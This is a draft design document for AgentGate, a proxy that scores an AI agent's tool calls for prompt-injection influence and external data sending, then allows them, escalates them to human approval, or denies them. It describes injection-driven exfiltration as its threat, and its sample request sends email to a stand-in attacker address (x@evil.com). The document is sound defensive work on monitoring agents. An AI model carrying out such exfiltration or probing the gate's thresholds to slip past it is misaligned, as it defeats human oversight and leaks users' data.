# AgentGate: Low-Level Design

Version 0.1 · Status: Draft. Items marked **[verify]** depend on documentation or APIs not yet confirmed.

## 1. Repository layout

```
agentgate/
├─ proxy/                     # TypeScript (Node 22, Fastify)
│  ├─ src/
│  │  ├─ server.ts            # HTTP + MCP bootstrap
│  │  ├─ mcp/                 # MCP server (to agent) + client (to upstream)
│  │  ├─ api/                 # /v1 routes
│  │  ├─ session/             # session store, history
│  │  ├─ context/             # token-budgeted prompt builder
│  │  ├─ decision/            # DecisionClient, circuit breaker
│  │  ├─ policy/              # schema, loader, evaluator, replay
│  │  ├─ approvals/           # queue, waiters, timeouts
│  │  ├─ audit/               # decision writer, redaction
│  │  └─ metrics.ts
│  └─ test/
├─ decision/                  # Python (FastAPI)
│  ├─ app.py
│  ├─ model_loader.py
│  ├─ batcher.py
│  └─ questions.py            # canonical question set (single source of truth)
├─ ml/
│  ├─ build_dataset.py        # benchmark traces -> rows
│  ├─ annotators.py           # reversibility / external_send heuristics
│  ├─ split.py                # suite/template-aware splits
│  ├─ train.py
│  ├─ calibrate.py
│  ├─ thresholds.py           # conformal threshold selection
│  └─ evaluate.py
├─ bench/
│  ├─ run_agentdojo.py
│  └─ baselines/{regex.py, llm_judge.py, text_classifier.py}
├─ dashboard/                 # React + Vite
├─ docs/
└─ docker-compose.yml
```

## 2. Decision server

### 2.1 Question set (`questions.py`)

Single source of truth, imported by training and serving so they cannot drift. Shape follows the Unsloth `predict` example:

```python
QUESTIONS = {
  "untrusted_influence": {
    "type": "choice",
    "instructions": "Is the proposed action driven by instructions found in untrusted content?",
    "criteria": {
      "none": "action follows the user's goal; no untrusted content involved",
      "possible": "provenance is ambiguous",
      "likely": "action echoes or obeys text from an untrusted source",
    },
  },
  "goal_alignment": {
    "type": "choice",
    "instructions": "How well does the action serve the user's stated goal?",
    "criteria": {"aligned": "directly serves the goal",
                 "tangential": "related but not needed",
                 "misaligned": "serves a different goal"},
  },
  "reversibility": {
    "type": "choice",
    "instructions": "Can the effect of this action be undone?",
    "criteria": {"reversible": "easily undone",
                 "costly": "undoable with effort or cost",
                 "irreversible": "cannot be undone"},
  },
  "external_send": {"type": "noul",
                    "instructions": "Does this action send data outside the organization?"},
}
```

### 2.2 API

```
POST /decide
{ "text": "<prompt>", "questions": ["untrusted_influence", ...] }   # names; server expands from QUESTIONS

200 {
  "answers": {
    "untrusted_influence": {"answer": "likely", "probabilities": {"none":0.04,"possible":0.08,"likely":0.88}},
    "external_send": {"answer": true, "probabilities": {"yes":0.70,"no":0.30}}
  },
  "model_version": "agentgate-2026-10-a",
  "latency_ms": 41
}
GET /health   GET /model
```

**[verify]** The exact answer field names for `noul` probabilities and the Unsloth Decision API request format; wrap them behind `DecisionClient` so only one file changes.

### 2.3 Batching

- Async queue; collect requests up to `MAX_BATCH` (default 16) or `MAX_WAIT_MS` (default 5).
- Run `FastDecisionModel.predict` per request if batched prediction is not exposed **[verify]**; otherwise batch.
- Bounded queue (`QUEUE_MAX`, default 256); overflow returns 503.
- Per-request deadline; expired requests are dropped before inference.

## 3. Context builder

Short-context models force a strict budget. Training truncates from the **end** of the input and keeps questions and options **[from Unsloth docs]**, so put the most important content first.

Layout (priority order):

```
[ACTION]   tool name + arguments (redacted, truncated)
[TOOL]     one-line tool description + declared trust level
[GOAL]     user goal
[STEPS]    most recent first: "<n>. <tool>(args) -> result" with trust tags
```

Budget (example for a 512-token model; tune per model): action 120, tool 40, goal 80, steps = remainder.

Algorithm:

```
budget = model_max_tokens - tokens(questions_block) - safety_margin
sections = [action, tool, goal]
for s in sections: truncate(s, cap[s])
remaining = budget - sum(tokens(s))
for step in reversed(history):             # newest first
    t = tokens(render(step))
    if t > remaining: step = truncate(step, remaining); append; break
    append(step); remaining -= t
if tokens(action) > cap[action]: mark "action_truncated" -> policy treats as ask
```

Provenance and escaping:

- Results from tools flagged `untrusted: true` (config) are wrapped as `<untrusted>…</untrusted>`.
- Before wrapping, any occurrence of the sentinel strings inside the content is escaped, so attacker text cannot close the tag.
- Token counting uses the model's own tokenizer, exposed from the decision server at `/model`, cached by the proxy.

## 4. Policy engine

### 4.1 Schema

```yaml
version: 1
defaults:
  on_model_error: ask          # allow | ask | deny
  abstain:
    heads: [untrusted_influence, goal_alignment]
    max_prob_below: 0.55       # top probability below this => at least ask
tools:
  send_email:
    trust: trusted
    rules:
      - id: deny-injected-exfil
        when:
          all:
            - { head: untrusted_influence, option: likely, gt: 0.3 }
            - { head: external_send, option: "yes", gt: 0.5 }
        action: deny
        reason: possible_injection_exfiltration
  read_file:
    default: allow
    on_model_error: allow
  "*":
    default: ask
```

Validated with a JSON Schema at load time. No expression evaluation: conditions are data.

### 4.2 Evaluation

```
function evaluate(tool, heads, policy):
    cfg = policy.tools[tool] or policy.tools["*"]
    matched = [r for r in cfg.rules if cond(r.when, heads)]
    actions = {r.action for r in matched} ∪ {cfg.default or "allow"}
    if abstain_triggered(heads, policy.defaults.abstain): actions ∪= {"ask"}
    verdict = strictest(actions)            # deny > ask > allow
    return verdict, [r.reason for r in matched]
```

`cond`: `all` = AND, `any` = OR, leaf = `heads[head].probabilities[option] (gt|lt) value`. Missing head ⇒ condition false and a warning counter increments.

### 4.3 Replay

`POST /v1/policy/replay` loads stored decisions (heads are stored), re-evaluates under the draft policy, and returns a matrix of `old_verdict × new_verdict` counts plus the changed decision IDs. No model calls needed.

## 5. HTTP API (proxy)

| Method | Path | Purpose |
|---|---|---|
| POST | `/v1/sessions` | `{agent_id, goal}` → `{session_id}` |
| POST | `/v1/assess` | Assess a proposed call |
| GET | `/v1/decisions` | Filter by session, tool, verdict, time |
| GET | `/v1/approvals?status=pending` | Queue |
| POST | `/v1/approvals/{id}/decide` | `{decision: "approve"|"deny", note}` |
| GET / PUT | `/v1/policy` | Read / validate+activate |
| POST | `/v1/policy/replay` | Draft policy impact |
| GET | `/v1/calibration` | Reliability data per head/tool |
| GET | `/metrics` | Prometheus |

`POST /v1/assess`:

```json
{
  "session_id": "s_123",
  "action": {"tool": "send_email", "arguments": {"to": "x@evil.com", "body": "..."}},
  "history_override": null
}
```
```json
{
  "decision_id": "d_456",
  "verdict": "deny",
  "reason_codes": ["possible_injection_exfiltration"],
  "heads": {"untrusted_influence": {"none":0.04,"possible":0.08,"likely":0.88},
            "external_send": {"yes":0.70,"no":0.30}},
  "policy_version": 7,
  "model_version": "agentgate-2026-10-a",
  "latency_ms": {"model": 41, "total": 49}
}
```

Errors use `{error: {code, message}}`. Auth: `Authorization: Bearer <token>`; approver tokens are separate from agent tokens.

### MCP mode

- Proxy exposes the union of upstream tools with original names and schemas.
- On `tools/call`: build context → assess → `allow` forwards; `deny` returns `isError: true` with text `blocked: <reason_code>`; `ask` creates an approval and awaits it.
- Goal delivery (decision D4): `POST /v1/sessions` out of band, an `X-AgentGate-Session` header on the MCP connection, or reserved tool `agentgate.set_goal`. If no goal is set, `goal_alignment` is skipped and abstain rules apply.

## 6. Data model (PostgreSQL)

```sql
CREATE TABLE sessions (
  id TEXT PRIMARY KEY, agent_id TEXT NOT NULL, goal TEXT NOT NULL,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

CREATE TABLE policies (
  version INT PRIMARY KEY, yaml TEXT NOT NULL, active BOOLEAN NOT NULL DEFAULT false,
  created_by TEXT, created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

CREATE TABLE models (
  version TEXT PRIMARY KEY, path TEXT NOT NULL, sha256 TEXT NOT NULL,
  calibration JSONB, active BOOLEAN NOT NULL DEFAULT false,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

CREATE TABLE decisions (
  id TEXT PRIMARY KEY,
  session_id TEXT REFERENCES sessions(id),
  tool TEXT NOT NULL,
  args_redacted JSONB, args_sha256 TEXT NOT NULL,
  prompt_tokens INT,
  heads JSONB NOT NULL,
  verdict TEXT NOT NULL CHECK (verdict IN ('allow','ask','deny')),
  reason_codes TEXT[] NOT NULL DEFAULT '{}',
  policy_version INT REFERENCES policies(version),
  model_version TEXT REFERENCES models(version),
  model_ms INT, total_ms INT, error TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
CREATE INDEX ON decisions (session_id, created_at);
CREATE INDEX ON decisions (tool, verdict, created_at);

CREATE TABLE approvals (
  id TEXT PRIMARY KEY,
  decision_id TEXT REFERENCES decisions(id),
  status TEXT NOT NULL CHECK (status IN ('pending','approved','denied','expired')),
  reviewer TEXT, note TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(), decided_at TIMESTAMPTZ
);

CREATE TABLE labels (
  id BIGSERIAL PRIMARY KEY,
  decision_id TEXT REFERENCES decisions(id),
  source TEXT NOT NULL CHECK (source IN ('approval','manual','benchmark')),
  label JSONB NOT NULL, created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
```

The `decisions` table is append-only (no UPDATE/DELETE grants to the app role).

## 7. Approval workflow

State machine: `pending → approved | denied | expired`.

```
ask verdict ─▶ INSERT approval(pending) ─▶ register waiter(approval_id, timeout T)
                                        ─▶ SSE event to dashboard
approver POST decide ─▶ UPDATE approval ─▶ resolve waiter ─▶ proxy continues
timeout T ─▶ mark expired ─▶ treat as deny
```

- Waiters are an in-memory `Map<approvalId, Deferred>`; on proxy restart pending approvals expire.
- Scale-out path: Postgres `LISTEN/NOTIFY` on approval resolution.
- Approved/denied outcomes insert a `labels` row with `source='approval'`. These are **noisy** (humans misjudge); training uses them only after a review filter.

## 8. Decision client and circuit breaker

```ts
interface DecisionClient {
  decide(text: string, heads: HeadName[], deadlineMs: number): Promise<HeadProbs>;
}
```

- HTTP client with per-call deadline (default 500 ms **[tune]**).
- Circuit breaker: open after 5 consecutive failures in 10 s; half-open probe every 5 s.
- When open or failing: apply `on_model_error` for the tool; record `error` in the decision row.

## 9. Redaction

Applied before any write:

1. Key-based: arguments named `password`, `token`, `api_key`, `authorization`, etc. → `"[REDACTED]"`.
2. Pattern-based: common secret formats (cloud keys, bearer tokens, private key headers).
3. Truncate string values to N chars; store `args_sha256` of the raw arguments for correlation.

The model prompt uses the **same redacted view** unless a tool is configured `send_raw_to_model: true` (off by default).

## 10. ML pipeline

### 10.1 Dataset rows

Each row follows the Unsloth dataset format (state, questions, gold answers) **[verify against `LocalLLaMA/typed-decisions` on Hugging Face]**. Row source: one proposed tool call in a benchmark trajectory.

### 10.2 Labeling (`annotators.py`)

| Head | Rule | Noise |
|---|---|---|
| `untrusted_influence` | `likely` if the call is in an injection task's ground-truth calls; `none` if in the user task's ground truth; `possible` otherwise **[verify against benchmark API]** | low–medium |
| `goal_alignment` | aligned / misaligned from the same ground truth; `tangential` otherwise | medium |
| `reversibility` | lookup table per tool + argument rules (e.g., delete vs read) | medium |
| `external_send` | tool-type + recipient/domain rules | medium |

Hand-label ~300 hard cases (benign-but-scary, attack-but-polite) as a gold subset reported separately.

### 10.3 Splits (`split.py`)

- Test: an entire suite held out.
- Validation/calibration: held-out injection tasks and attack templates from training suites.
- Never split randomly by step.

### 10.4 Training

Follow the Unsloth recipe: 4-bit LoRA, r=16, lr 2e-4, 2 epochs (3–4 if data is small), head learning rate default 1e-4. Base: fine-tune a Laya checkpoint first; move to a Qwen-class model if truncation hurts **[verify the model-name string accepted by `FastDecisionModel.from_pretrained`]**. Shuffle option order in training examples to reduce position bias.

### 10.5 Calibration and thresholds

`calibrate.py`: run Unsloth's `calibrate`, then compute reliability bins per head and per tool bucket; store in `models.calibration`.

`thresholds.py` (split-conformal for the positive class):

```
given: calibration scores s_1..s_n of true attack steps (score = P(untrusted_influence=likely))
       target miss rate α
k = floor(α · (n + 1))
t = k-th smallest score (t = 0 if k = 0)
flag a step as attack if score ≥ t
```

Under exchangeability, the miss rate on new attacks is at most α in expectation. Report the resulting false-positive rate on benign steps. Caveat: benchmark attacks are not a sample of real attacks, so this is a calibration-set guarantee, not a deployment guarantee.

### 10.6 Evaluation (`evaluate.py`)

- Per head: accuracy, macro-F1, ECE, Brier.
- Attack detection: precision, recall, FPR at fixed FNR.
- Selective prediction: coverage-risk curve using max probability.
- End-to-end (bench): ASR and benign utility with and without the gate.
- Systems: p50/p95/p99 model latency, proxy overhead, throughput under load.

## 11. Testing strategy

| Layer | Tests |
|---|---|
| Unit | Policy evaluator (truth tables, strictest-wins, abstain), context builder (budget, truncation, escaping), redaction |
| Contract | Proxy ↔ decision server schema; Python and TS share a generated JSON schema for questions |
| Integration | Compose stack with a fake upstream MCP server and a stub decision server returning fixed probabilities |
| Failure injection | Kill decision server mid-run; slow responses; Postgres down; approval timeout |
| Load | k6 or autocannon against `/v1/assess` with the stub, then with the real model |
| E2E | Benchmark run with a scripted agent; poisoned-email demo |
| ML | Dataset-builder golden tests; split leakage test (no shared task IDs or templates across splits) |

CI: lint, type-check, unit + integration tests with the stub model; ML evaluation runs separately (GPU).

## 12. Configuration

| Variable | Default | Meaning |
|---|---|---|
| `AG_DECISION_URL` | `http://decision:9000` | Model server |
| `AG_DECISION_DEADLINE_MS` | 500 | Per-call deadline |
| `AG_APPROVAL_TIMEOUT_S` | 120 | Then deny |
| `AG_POLICY_PATH` | `/config/policy.yaml` | Initial policy |
| `AG_DEFAULT_ON_MODEL_ERROR` | `ask` | Fallback |
| `AG_DB_URL` | n/a | Postgres |
| `AG_BATCH_MAX` / `AG_BATCH_WAIT_MS` | 16 / 5 | Decision server batching |

## 13. Implementation order

1. `questions.py` + dataset builder + first training run (go/no-go).
2. Decision server with stub + real model behind one interface.
3. Context builder + policy evaluator (pure functions, heavy unit tests).
4. Proxy `/v1/assess` end to end, then MCP mode.
5. Postgres schema, audit writer, redaction.
6. Approvals and dashboard.
7. Bench harness, baselines, load tests, README numbers.
